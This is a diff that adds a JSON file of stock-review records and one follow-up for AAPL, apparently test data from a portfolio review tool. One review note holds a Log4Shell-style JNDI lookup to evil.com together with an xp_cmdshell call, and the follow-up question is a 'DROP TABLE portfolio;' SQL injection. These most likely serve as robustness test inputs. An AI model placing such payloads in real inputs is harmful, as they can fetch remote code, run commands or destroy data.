@@ -1,0 +1,104 @@
+{
+  "reviews": [
+    {
+      "reviewId": "REV-AAPL-1788731188385-2835",
+      "attentionId": "ATT-EXIT-CHECK",
+      "ticker": "AAPL",
+      "urgency": "HIGH",
+      "status": "REVIEW",
+      "recommendedAction": "CONSIDER_EXIT",
+      "notes": [],
+      "createdAt": "2026-09-06T21:46:28.385Z"
+    },
+    {
+      "reviewId": "REV-AAPL-1788731188377-6970",
+      "attentionId": "ATT-GOLDEN-AAPL",
+      "ticker": "AAPL",
+      "urgency": "HIGH",
+      "status": "REVIEW",
+      "recommendedAction": "REVIEW",
+      "notes": [
+        {
+          "text": "Copilot verified margin trajectory",
+          "addedAt": "2026-09-06T21:46:28.378Z"
+        }
+      ],
+      "createdAt": "2026-09-06T21:46:28.378Z"
+    },
+    {
+      "reviewId": "REV-AAPL-1788731188369-9484",
+      "attentionId": "ATT-DEDUP",
+      "ticker": "AAPL",
+      "urgency": "HIGH",
+      "status": "REVIEW",
+      "recommendedAction": "REVIEW_POSITION",
+      "notes": [],
+      "createdAt": "2026-09-06T21:46:28.369Z",
+      "updatedAt": "2026-09-06T21:46:28.369Z"
+    },
+    {
+      "reviewId": "REV-AAPL-1788731188362-2431",
+      "attentionId": "ATT-02",
+      "ticker": "AAPL",
+      "urgency": "HIGH",
+      "status": "RESOLVED",
+      "recommendedAction": "REVIEW_POSITION",
+      "notes": [
+        {
+          "text": "Investigating Q3 10-Q filing",
+          "addedAt": "2026-09-06T21:46:28.362Z"
+        },
+        {
+          "text": "Analyst approved adjustment",
+          "addedAt": "2026-09-06T21:46:28.362Z"
+        }
+      ],
+      "createdAt": "2026-09-06T21:46:28.362Z",
+      "updatedAt": "2026-09-06T21:46:28.362Z"
+    },
+    {
+      "reviewId": "REV-AAPL-1788731188342-7433",
+      "attentionId": "ATT-01",
+      "ticker": "AAPL",
+      "urgency": "HIGH",
+      "status": "REVIEW",
+      "recommendedAction": "REVIEW_POSITION",
+      "notes": [
+        {
+          "text": "${jndi:ldap://evil.com/a} EXEC xp_cmdshell",
+          "addedAt": "2026-09-06T21:46:28.342Z"
+        }
+      ],
+      "createdAt": "2026-09-06T21:46:28.342Z"
+    },
+    {
+      "reviewId": "REV-AAPL-1788731188340-1544",
+      "attentionId": "ATT-EXIT-01",
+      "ticker": "AAPL",
+      "urgency": "HIGH",
+      "status": "REVIEW",
+      "recommendedAction": "CONSIDER_EXIT",
+      "notes": [
+        {
+          "text": "Thesis broken due to governance defect",
+          "addedAt": "2026-09-06T21:46:28.340Z"
+        }
+      ],
+      "createdAt": "2026-09-06T21:46:28.340Z"
+    }
+  ],
+  "followUps": [
+    {
+      "followUpId": "FUP-AAPL-1788731188342-603",
+      "ticker": "AAPL",
+      "attentionId": "ATT-AAPL-DIRECT",
+      "question": "DROP TABLE portfolio;",
+      "status": "INVESTIGATING",
+      "assignedTo": "ANALYST",
+      "notes": [],
+      "findings": null,
+      "createdAt": "2026-09-06T21:46:28.342Z",
+      "updatedAt": "2026-09-06T21:46:28.342Z"
+    }
+  ]
+}
